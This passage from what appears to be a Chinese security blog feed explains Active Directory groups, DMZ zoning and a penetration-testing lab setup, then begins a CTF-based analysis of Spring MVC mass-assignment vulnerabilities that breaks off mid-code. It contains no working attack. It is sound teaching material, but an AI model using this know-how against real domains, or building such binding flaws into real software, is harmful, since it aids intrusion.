title="成员服务器"></a>成员服务器</h5><p>成员服务器是指安装了服务器OS并加入了域、但没有安装活动目录的计算机，其主要任务是提供网络资源。</p><p>成员服务器的类型通常有文件服务器、应用服务器、数据库服务器、Web服务器、邮件服务器、防火墙、远程访问服务器、打印服务器等。</p><h5 id="客户机"><a href="#客户机" class="headerlink" title="客户机"></a>客户机</h5><p>客户机是域中用户使用的计算机，用户通过客户机和域中的账户就能登录访问域。</p><h5 id="独立服务器"><a href="#独立服务器" class="headerlink" title="独立服务器"></a>独立服务器</h5><p>独立服务器和域没啥关系。如果服务器没加入域，也没安装活动目录，则称为独立服务器。</p><p>独立服务器可以创建工作组、与网络中的其他计算机共享资源，但不能使用活动目录提供的任何服务。</p><h4 id="域内权限"><a href="#域内权限" class="headerlink" title="域内权限"></a>域内权限</h4><p>组（Group）是用户账号的集合。通过向一组用户分配权限，就可以不必向每个用户分别分配权限。</p><p>下面看下几个类型的组。</p><h5 id="域本地组"><a href="#域本地组" class="headerlink" title="域本地组"></a>域本地组</h5><p>域本地组是指多域用户访问单域资源（访问同一个域），主要用于授权本域内资源的访问权限。</p><p>域本地组的成员可以来自域林中的任何域，域本地组用来访问同一域中的资源。</p><h5 id="全局组"><a href="#全局组" class="headerlink" title="全局组"></a>全局组</h5><p>全局组是指单域用户访问多域资源（必须是一个域里面的用户），只能在创建该全局组的域中添加用户和全局组。</p><p>全局组的成员可包括其所在域中的其他组和账户，而且可在林中的任何域中指派权限。</p><h5 id="通用组"><a href="#通用组" class="headerlink" title="通用组"></a>通用组</h5><p>通用组是指多域用户访问多域资源。</p><p>通用组的成员可包括域树或域林中任何域的其他组和账户，而且可在该域树或域林中的任何域中指派权限。</p><h5 id="小Trick"><a href="#小Trick" class="headerlink" title="小Trick"></a>小Trick</h5><ul><li>域本地组：来自全林，作用于本域；</li><li>全局组：来自本域，作用于全林；</li><li>通用组：来自全林，作用于全林；</li></ul><h5 id="A-G-DL-P策略"><a href="#A-G-DL-P策略" class="headerlink" title="A-G-DL-P策略"></a>A-G-DL-P策略</h5><p>A-G-DL-P策略（A：Account，用户账号；G：Global Group，全局组；DL：Domain Local Group，域本地组；P：Permission，资源权限）是指将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。</p><p>A-G-DL-P策略是为了方便对用户进行组织和管理。当需要给一个用户添加某个权限时，只需要把这个用户添加到某一个域本地组中就可以了。</p><h5 id="内置组"><a href="#内置组" class="headerlink" title="内置组"></a>内置组</h5><p>在安装DC时，系统会自动生成一些组，即内置组。内置组内定义了一些常用的权限。通过将用户添加到内置组中，可以是用户获得相应的权限。</p><p>“Active Directory 用户和计算机”中的”Builtin”和”Users”组织单元中的组就是内置组，内置的域本地组在”Builtin”中，内置的全局组和通用组在”Users”中。</p><p>几个比较重要的域本地组权限：</p><ul><li>管理员组（Administrators）的成员可以完全不受限制地存取计算机/域的资源，不仅是最具权力的一个组，也是在活动目录和域控制器中具有默认的管理员权限的组。该组的成员可以更改 Enterprise Admins、Schem Admins 和 Domain Admins 组的成员关系，是域森林中强大的服务管理组。</li><li>远程登录组（Remote Desktop Users）的成员被授予远程登录的权限。</li><li>打印机操作员组（Print Operators）的成员可以管理网络打印机，包括建立、管理及删除网络打印机，并可以在本地登录和关闭域控制器。</li><li>账号操作员组（Account Operators）的成员可以创建和管理该域中的用户和组，并可以设置其权限，但是，不能更改隶属 Administrators 或 Domain Admins 组的账户，也不能修改这些组。Account Operators 可以在本地登录域控制器。在默认情况下，该组中没有成员。</li><li>服务器操作员组（Server Operators）的成员可以管理域服务器，包括建立/管理/删除任何服务器的共享目录、管理网络打印机、备份任何服务器的文件、格式化服务器硬盘、锁定服务器，以及变更服务器的系统时间等权限，并能关闭域控制器。在默认情况下，该组中没有成员。</li><li>备份操作员组（Backup Operators）的成员可以在域控制器上执行备份和还原操作，并可以在本地登录和关闭域控制器。在默认情况下，该组中没有成员。</li></ul><p>几个比较重要的全局组、通用组的权限：</p><ul><li>域管理员组（Domain Admins）的成员在所有加入域的服务器和工作站、域控制器和活动目录上均默认拥有完整的管理员权限。因为该组会被添加到自己所在域的 Administrators 组 中，因此可以继承 Administrators 组的所有权限。同时，该组默认会被添加到每台域成员计算机的本地 Administrators 组中，这样，Domain Admins 就对域中的所有计算机拥有了所有权。如果希望某用户成为域系统管理器，建议将该用户加至 Domain Admins 组中，而不要直接将该用户添加到 Administrators 组中。</li><li>企业系统管理员组（Enterprise Admins）是域森林根域中的一个组。该组在域森林中的每个域内都是 Administrators 组的成员，因此对所有域控制器都有完全访问权。</li><li>架构管理员组（Schema Admins）是域森林根域中的一个组，可以修改活动目录域森林的模式。由于管理员组是提供活动目录和域控制器完整权限的域用户组，该组成员的资格是非常重要的。</li><li>域用户组（Domain Users）是所有域的成员。在预设的情况下，任何由我们建立的用户账户都是 Domain Users 组的成员，而任何由我们建立的计算机账户都是 Domain Computers 组的成员。因此，如果想让所有账户都具有某种资源存取权限，可以将该权限指定给 Domain Users 组，或者让 Domain Users 组属于具有该权限的组。Domain Users 组在预设的情况下是内建域局域 Users 组的成员。</li></ul><h3 id="活动目录"><a href="#活动目录" class="headerlink" title="活动目录"></a>活动目录</h3><p>活动目录（Active Directory，简称AD）是指域环境中提供目录服务的组件。AD存储了有关网络对象（比如用户、组、计算机、共享资源、打印机等）的信息，并且让管理员和用户能够轻松地查找和使用这些信息。AD使用了一种结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻辑的分层组织。</p><p>域树/域林内的所有域共享一个活动目录，每个域只存储该域内的数据。</p><p>活动目录(Active Directory)主要提供以下功能：</p><ol><li>服务器及客户端计算机管理：管理服务器及客户端计算机账户，所有服务器及客户端计算机加入域管理并实施组策略。</li><li>用户服务：管理用户域账户、用户信息、企业通讯录（与电子邮件系统集成）、用户组管理、用户身份认证、用户授权管理等，按省实施组管理策略。</li><li>资源管理：管理打印机、文件共享服务等网络资源。</li><li>桌面配置：系统管理员可以集中的配置各种桌面配置策略，如：用户使用域中资源权限限制、界面功能的限制、应用程序执行特征限制、网络连接限制、安全配置限制等。</li><li>应用系统支撑：支持财务、人事、电子邮件、企业信息门户、办公自动化、补丁管理、防病毒系统等各种应用系统。</li></ol><p><strong>域控制器与活动目录的区别</strong></p><p>AD库：活动目录数据库，是指用于将大型网络中众多的对象（如计算机、用户、用户组、打印机、共享文件等）分类存放并将检索信息整理好以便于查找、管理和使用这些对象的数据库。</p><p>可知，这个AD库是实现域环境的关键。<strong>如果内网中某台计算机安装了AD，那么它就成为了DC（用于存储活动目录数据库的计算机）</strong>。</p><h3 id="安全域的划分"><a href="#安全域的划分" class="headerlink" title="安全域的划分"></a>安全域的划分</h3><p>安全域划分即将同一安全等级的计算机划入同一个的网段，这样这些计算机都拥有相同的网络边界，并在网络边界上通过部署防火墙来实现对其他安全域的网络访问控制策略（NACL）。在一个用路由器连接的局域网中,我们可以将网络划分为三个区域：安全级别最高的LAN Area（内网），安全级别中等的DMZ区域和安全级别最低的Internet区域（外网）。三个区域因担负不同的任务而拥有不同的访问策略。</p><p>而安全域的划分一般分为DMZ和内网。</p><p>典型的中小型内网的安全域划分如图，这里有两个安全域即两个虚线划出来的安全边界：</p><p><img src="/2020/02/15/内网渗透基础/5.png" alt=""></p><h4 id="DMZ"><a href="#DMZ" class="headerlink" title="DMZ"></a>DMZ</h4><p>两个防火墙之间的空间被称为DMZ。安全性：<code>Internet &lt; DMZ &lt; 内网</code>。</p><p>DMZ（Demilitarized Zone），隔离区，也称非军事化区。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。</p><p>DMZ的屏障功能：</p><ol><li>内网可以访问外网：内网的用户显然需要自由地访问外网。在这一策略中，防火墙需要进行源地址转换。</li><li>内网可以访问DMZ：此策略是为了方便内网用户使用和管理DMZ中的服务器。</li><li>外网不能访问内网：很显然，内网中存放的是公司内部数据，这些数据不允许外网的用户进行访问。</li><li>外网可以访问DMZ：DMZ中的服务器本身就是要给外界提供服务的，所以外网必须可以访问DMZ。同时，外网访问DMZ需要由防火墙完成对外地址到服务器实际地址的转换。</li><li>DMZ访问内网有限制：很明显，如果违背此策略，则当入侵者攻陷DMZ时，就可以进一步进攻到内网的重要数据。</li><li>DMZ不能访问外网：此条策略也有例外，比如DMZ中放置邮件服务器时，就需要访问外网，否则将不能正常工作。在网络中，非军事区(DMZ)是指为不信任系统提供服务的孤立网段，其目的是把敏感的内部网络和其他提供访问服务的网络分开，阻止内网和外网直接通信，以保证内网安全。</li></ol><h4 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h4><p>内网在安全域划分中是安全级别最高的，其中可以分为办公区和核心区。</p><h2 id="0x02-内网域环境搭建"><a href="#0x02-内网域环境搭建" class="headerlink" title="0x02 内网域环境搭建"></a>0x02 内网域环境搭建</h2><p>内网渗透很大程度上就是域渗透，这里使用Windows Server 2012 R2、Windows Server 2008 R2和Windows 7搭建最为简单的迷你型域环境，其中将Windows Server 2012 R2服务器安装AD升级为DC，然后将Windows Server 2008 R2和Windows 7加入到该域中。此外，再安装Monowall来构建含有防火墙的二级内网。</p><p>下面推荐几个下载OS镜像的地址：</p><ul><li><a href="https://msdn.itellyou.cn/" target="_blank" rel="noopener">https://msdn.itellyou.cn/</a></li><li><a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/" target="_blank" rel="noopener">https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/</a></li><li><a href="https://pcriver.com/operating-systems/windows-xp-professional-iso-download.html" target="_blank" rel="noopener">https://pcriver.com/operating-systems/windows-xp-professional-iso-download.html</a></li></ul><p>注意，为了 更逼真的内网环境，两台机子的虚拟网卡都选择Host-only模式。</p><h3 id="搭建域控制器"><a href="#搭建域控制器" class="headerlink" title="搭建域控制器"></a>搭建域控制器</h3><p>这里先安装好Windows Server 2012 R2系统，按如下步骤操作。</p><h4 id="设置IP"><a href="#设置IP" class="headerlink" title="设置IP"></a>设置IP</h4><p>这里设置服务器IP为192.168.1.1，而且一般域控制器和DNS服务器都是装在一起的，因此DNS服务器地址也写本机就好：</p><p><img src="/2020/02/15/内网渗透基础/6.png" alt=""></p><h4 id="更改计算机名"><a href="#更改计算机名" class="headerlink" title="更改计算机名"></a>更改计算机名</h4><p>在“控制面板-&gt;系统和安全-&gt;系统”中点击“更改设置-&gt;更改”，然后把计算机名改为“DC”，点击确定后重启计算机生效。</p><h4 id="安装域控制器和DNS服务"><a href="#安装域控制器和DNS服务" class="headerlink" title="安装域控制器和DNS服务"></a>安装域控制器和DNS服务</h4><p>Windows Server 2012 R2在开机时会自动打开服务器管理器，我们直接点击“添加角色和功能”：</p><p><img src="/2020/02/15/内网渗透基础/7.png" alt=""></p><blockquote><p>保持默认设置，单击“下 一步”按钮，进入“安装类型”页面。选择“基于角色或者基于功能的安装”选项，单击“下一 步”按钮，进入“服务器选择”选择页面。目前的服务器池中只有当前这一台机器，保持默认设置。单击“下一步”按钮，在“服务器角色”页面勾选“Active Directory 域服务”和“DNS 服务器”复选框：</p></blockquote><p><img src="/2020/02/15/内网渗透基础/8.png" alt=""></p><p>在“功能”页面，保持默认设置，单击“下一步”按钮，进入“确认”页面。确认需要安装 的组件后，勾选“如果需要，自动重新启动目标服务器”复选框，然后单击安装：</p><p><img src="/2020/02/15/内网渗透基础/9.png" alt=""></p><h4 id="升级服务器"><a href="#升级服务器" class="headerlink" title="升级服务器"></a>升级服务器</h4><blockquote><p>Active Directory 域服务安装完成后，需要将此服务器提升为域控制器。单击“将此服务器提 升为域控制器”选项（如果不慎单击了“关闭”按钮，可以在“服务器管理器”页面中打开相关 页面），在右上角可以看到一个中间有“！”的三角形按钮。单击该按钮，提升服务器：</p></blockquote><p><img src="/2020/02/15/内网渗透基础/10.png" alt=""></p><blockquote><p>AD 域服务安装完成。接着，进入“Active Directory 域服务配置向导”页面，在部署操作中单 击选中“添加新林”单选按钮并输入根域名（必须使用允许的 DNS 域命名约定） 。将根域名设置 为“hacke.testlab”：</p></blockquote><p><img src="/2020/02/15/内网渗透基础/11.png" alt=""></p><blockquote><p>在“域控制器选项”页面，将林功能级别、域功能级别都设置为 Windows Server 2012 R2，如图所示。在创建新林时，在默认情况下选择 DNS 服务器，林中的第一个域控制器必须是全局目录服务器且不能是只读域控制器（RODC） 。输入目录服务还原模式密码，在开机进入安全模式修复 AD 数据库时将使用此密码。 </p></blockquote><p><img src="/2020/02/15/内网渗透基础/12.png" alt=""></p><p>在 DNS 选项页面会出现关于 DNS 的警告。不用理会该警告，保持默认设置。单击“下一步” 按钮，进入“其他选项”页面，在 NetBIOS 域名（不支持DNS 域名的旧系统，如 Windows 98、 NT 系统，需要通过 NetBIOS 域名进行通信）页面保持默认设置。单击“下一步”按钮，进入“路 径”界面，指定数据库、日志、sysvol 的存放位置，其他选项保持默认设置。接着单击“下一步” 按钮，保持页面上的默认设置。当到了先决条件检查时，会检测出当前Administrator用户密码不符合要求，这是因为Administrator用户将成为域Administrator用户了：</p><p><img src="/2020/02/15/内网渗透基础/28.png" alt=""></p><p>此时我们去创建或修改Administrator用户的密码后再点击“重新运行先决条件检测”，这时候发现就OK了，直接单击“安装”即可。</p><p>安装完成后，需要重启服务器。重启完成后，需要使用域管理员账户（HACKE\Administrator）登录。此时在“服 务器管理器”页面就可以看到 AD DS、DNS 服务了，如图所示。 </p><p><img src="/2020/02/15/内网渗透基础/13.png" alt=""></p><h4 id="创建Active-Directory用户"><a href="#创建Active-Directory用户" class="headerlink" title="创建Active Directory用户"></a>创建Active Directory用户</h4><p>为Windows 7创建域控账户，在“Active Directory 用户和计算机”页面转到“Users”目录并单击右键，添加新用户：</p><p><img src="/2020/02/15/内网渗透基础/14.png" alt=""></p><p>创建一个testuser账户：</p><p><img src="/2020/02/15/内网渗透基础/15.png" alt=""></p><h3 id="配置Windows-7加入该域"><a href="#配置Windows-7加入该域" class="headerlink" title="配置Windows 7加入该域"></a>配置Windows 7加入该域</h3><p>将Windows 7系统加入该域，先设置IP地址为192.168.1.2，DNS地址为192.168.1.1， 然后查看设置并运行<code>ping hacker.testlab</code>命令进行测试：</p><p><img src="/2020/02/15/内网渗透基础/16.png" alt=""></p><p>接下来，将主机加入域，更改计算机名为“WIN7-x64”，将域名更改为 “hacker.testlab”。 单击“确定”按钮后，会弹出要求输入拥有权限的域账户名称和密码的对话框。 在这里，输入域管理员用户账号和密码：</p><p><img src="/2020/02/15/内网渗透基础/17.png" alt=""></p><p>操作成功后，会出现重启计算机的提示。用创建的testuser用户登录域即可。</p><p>此时，我们在DC中“Active Directory 用户和计算机”页面的Computers项可以看到Win7加入的计算机名：</p><p><img src="/2020/02/15/内网渗透基础/18.png" alt=""></p><p>当我们右键该项选择“所有任务-&gt;管理”时，会报如下错误，这是防火墙拦截的原因：</p><p><img src="/2020/02/15/内网渗透基础/19.png" alt=""></p><p><img src="/2020/02/15/内网渗透基础/20.png" alt=""></p><p>此时，为了方便，就直接将Win7上的防火墙关闭掉就好，当然在当前域环境下，在Win7进行相关操作时需要DC的adminsitrator用户权限才能操作的：</p><p><img src="/2020/02/15/内网渗透基础/21.png" alt=""></p><p>此时回到DC，我们就能成功管理这台Win7了：</p><p><img src="/2020/02/15/内网渗透基础/22.png" alt=""></p><h3 id="配置Windows-Server-2008-R2加入该域"><a href="#配置Windows-Server-2008-R2加入该域" class="headerlink" title="配置Windows Server 2008 R2加入该域"></a>配置Windows Server 2008 R2加入该域</h3><p>同Win7上面的操作一样，看下结果就好：</p><p><img src="/2020/02/15/内网渗透基础/29.png" alt=""></p><p><img src="/2020/02/15/内网渗透基础/30.png" alt=""></p><h3 id="通过防火墙m0n0wall构建二级内网"><a href="#通过防火墙m0n0wall构建二级内网" class="headerlink" title="通过防火墙m0n0wall构建二级内网"></a>通过防火墙m0n0wall构建二级内网</h3><h4 id="m0n0wall简介"><a href="#m0n0wall简介" class="headerlink" title="m0n0wall简介"></a>m0n0wall简介</h4><p>m0n0wall 是一个完整的、嵌入式的防火墙软件包，该软件包可以安装于嵌入式PC里。m0n0wall基于bare-bones version of FreeBSD，包括一个WEB服务器，PHP和另一些工具软件。整个系统的配置保存在一个XML文件当中。m0n0wall可能是第一个启动时通过PHP配置的UNIX系统。m0n0wall编写者认为m0n0wall不包含在第3层 和第4层防火墙的基础服务外的任何功能。因为m0n0wall是嵌入式的防火墙面向嵌入设备有限的CPU资源和记忆体资源。m0n0wall不允许登录： 在控制台没有登录提示符，（它被一个功能菜单代替） ,没有任何Telnet或SSH守护程序。</p><p>官网：<a href="https://m0n0.ch/wall/index.php" target="_blank" rel="noopener">https://m0n0.ch/wall/index.php</a></p><p>含中文版的下载地址：<a href="http://www.cat-home.org/?action=show&amp;id=158" target="_blank" rel="noopener">http://www.cat-home.org/?action=show&amp;id=158</a></p><h4 id="m0n0wall安装"><a href="#m0n0wall安装" class="headerlink" title="m0n0wall安装"></a>m0n0wall安装</h4><p>在VM中新建虚拟机，打开对应的iso文件，选择FreeBSD版本，内存选择10G即可。</p><p>都点击确认好之后，重点在于还需要给该虚拟机添加多一个网卡，即一个为Host-only模式用于内网，另一个为桥接模式连接外网：</p><p><img src="/2020/02/15/内网渗透基础/23.png" alt=""></p><p>之后启动虚拟机即可开启安装。</p><p>首先是需要安装到硬盘中，选择7：</p><p><img src="/2020/02/15/内网渗透基础/24.png" alt=""></p><p>接着选择硬盘，这里只有一块名为ad3的硬盘，选择它并输入确认y：</p><p><img src="/2020/02/15/内网渗透基础/25.png" alt=""></p><p>此时只需等待安装完成。</p><h4 id="网卡接口分配"><a href="#网卡接口分配" class="headerlink" title="网卡接口分配"></a>网卡接口分配</h4><p>重启之后进入如下界面，我们先输入1来进行网卡接口的分配：</p><p><img src="/2020/02/15/内网渗透基础/26.png" alt=""></p><p>如图输入，第一个设置LAN即内网网卡的填em0即通过Mac地址找到的对应Host-only那个网卡，第二个设置WAN即外网网卡的填em1即通过Mac地址找到的对应桥接那个网卡：</p><p><img src="/2020/02/15/内网渗透基础/27.png" alt=""></p><p>之后重启即可。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="内网渗透" scheme="https://www.mi1k7ea.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>浅析自动绑定漏洞之Spring MVC</title>
    <link href="https://www.mi1k7ea.com/2020/02/12/%E6%B5%85%E6%9E%90%E8%87%AA%E5%8A%A8%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E%E4%B9%8BSpring-MVC/"/>
    <id>https://www.mi1k7ea.com/2020/02/12/浅析自动绑定漏洞之Spring-MVC/</id>
    <published>2020-02-12T13:40:37.000Z</published>
    <updated>2020-02-13T15:18:48.823Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-Spring-MVC自动绑定漏洞"><a href="#0x01-Spring-MVC自动绑定漏洞" class="headerlink" title="0x01 Spring MVC自动绑定漏洞"></a>0x01 Spring MVC自动绑定漏洞</h2><h3 id="自动绑定漏洞"><a href="#自动绑定漏洞" class="headerlink" title="自动绑定漏洞"></a>自动绑定漏洞</h3><p>自动绑定功能在很多框架中都有实现，主要功能是允许软件框架自动将HTTP请求中的参数绑定到程序变量或对象中以便于开发者访问。</p><p>而自动绑定漏洞的漏洞点在于，攻击者可能将额外的HTTP请求参数绑定到一个对象上，使用这种方法来创建、修改、更新开发人员或者业务本身从未打算设计到的参数，而这些新参数反过来又会影响程序代码中不需要的新变量或对象，进而触发一些业务逻辑漏洞。</p><p>一般而言，自动绑定漏洞的发现是通过白盒审计的形式才能找到的。</p><h3 id="Spring-MVC中两个关键注解"><a href="#Spring-MVC中两个关键注解" class="headerlink" title="Spring  MVC中两个关键注解"></a>Spring  MVC中两个关键注解</h3><p>在Spring MVC框架中与自动绑定漏洞相关的注解有如下两个。</p><h4 id="ModelAttribute注解"><a href="#ModelAttribute注解" class="headerlink" title="@ModelAttribute注解"></a>@ModelAttribute注解</h4><p>通过@ModelAttribute注解可实现以下两个功能：</p><p><strong>1、绑定请求参数到实体对象（表单的命令对象）</strong></p><p>@ModelAttribute注解运用在参数上，会将客户端传递过来的参数按名称注入到指定对象中，并且会将这个对象自动加入ModelMap中，便于View层使用。</p><p>如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/register"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">register</span><span class="params">(@ModelAttribute(<span class="string">"user"</span>)</span> UserForm user) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">"zhangsan"</span>.equals(uname) &amp;&amp; <span class="string">"123456"</span>.equals(upass)) &#123;</span><br><span class="line">        logger.info(<span class="string">"成功"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"login"</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        logger.info(<span class="string">"失败"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"register"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述代码中<code>@ModelAttribute（&quot;user&quot;）UserForm user</code>语句的功能有两个：</p><ul><li>将请求参数的输入封装到user对象中。</li><li>创建UserForm实例。</li></ul><p>以“user”为键值存储在Model对象中，和<code>model.addAttribute(&quot;user&quot;，user)</code>语句的功能一样。如果没有指定键值，即<code>@ModelAttribute UserForm user</code>，那么在创建UserForm实例时以“userForm”为键值存储在Model对象中，和<code>model.addAtttribute(&quot;userForm&quot;, user)</code>语句的功能一样。</p><p><strong>2、注解一个非请求处理方法</strong></p><p>被@ModelAttribute注解的方法将在每次调用该控制器类的请求处理方法前被调用。这种特性可以用来控制登录权限，当然控制登录权限的方法有很多，例如拦截器、过滤器等。</p><p>使用该特性控制登录权限，创建BaseController，代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpSession;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ModelAttribute;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BaseController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@ModelAttribute</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">isLogin</span><span class="params">(HttpSession session)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (session.getAttribute(<span class="string">"user"</span>) == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> Exception(<span class="string">"没有权限"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建ModelAttributeController，代码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/admin"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ModelAttributeController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/add"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">add</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"addSuccess"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/update"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"updateSuccess"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping</span>(<span class="string">"/delete"</span>)</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">delete</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"deleteSuccess"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上述ModelAttributeController类中的add、update、delete请求处理方法执行时，首先执行父类BaseController中的isLogin()方法判断登录权限，可以通过地址<code>http://localhost:8080/springMVCDemo02/admin/add</code>测试登录权限。</p><h4 id="SessionAttributes注解"><a href="#SessionAttributes注解" class="headerlink" title="@SessionAttributes注解"></a>@SessionAttributes注解</h4><p>默认情况下Spring MVC将模型中的数据存储到request域中。当一个请求结束后，数据就失效了。如果要跨页面使用。那么需要使用到session。而@SessionAttributes注解就可以使得模型中的数据存储一份到session域中。</p><blockquote><p>Spring 允许我们有选择地指定 ModelMap 中的哪些属性需要转存到 session 中，以便下一个请求对应的 ModelMap 的属性列表中还能访问到这些属性。这一功能是通过类定义处标注 @SessionAttributes(“user”) 注解来实现的。SpringMVC 就会自动将 @SessionAttributes 定义的属性注入到 ModelMap 对象，在 setup action 的参数列表时，去 ModelMap 中取到这样的对象，再添加到参数列表。只要不去调用 SessionStatus 的 setComplete() 方法，这个对象就会一直保留在 Session 中，从而实现 Session 信息的共享。</p></blockquote><h2 id="0x02-案例"><a href="#0x02-案例" class="headerlink" title="0x02 案例"></a>0x02 案例</h2><p>这里参考ZeroNigths HackQuest 2016的两道和自动绑定漏洞相关的Web题，源码下载地址: <a href="https://github.com/3wapp/ZeroNights-HackQuest-2016" target="_blank" rel="noopener">https://github.com/3wapp/ZeroNights-HackQuest-2016</a></p><h3 id="Justice-League"><a href="#Justice-League" class="headerlink" title="Justice League"></a>Justice League</h3><p>将war包放置于Tomcat中跑起来后，看到Justice League页面存在4个功能点：关于、注册、登录、找回密码。</p><p><img src="/2020/02/12/浅析自动绑定漏洞之Spring-MVC/8.png" alt=""></p><h4 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h4><p>下面先进行代码审计，直接看到注册功能的Controller，ResetPasswordController.java：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@SessionAttributes</span>(<span class="string">"user"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ResetPasswordController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LoggerFactory.getLogger(ResetPasswordController.class);</span><br><span class="line"></span><br><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RequestMapping</span>(value = <span class="string">"/reset"</span>, method = RequestMethod.GET)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">resetViewHandler</span><span class="params">()</span> </span>&#123;</span><br><span 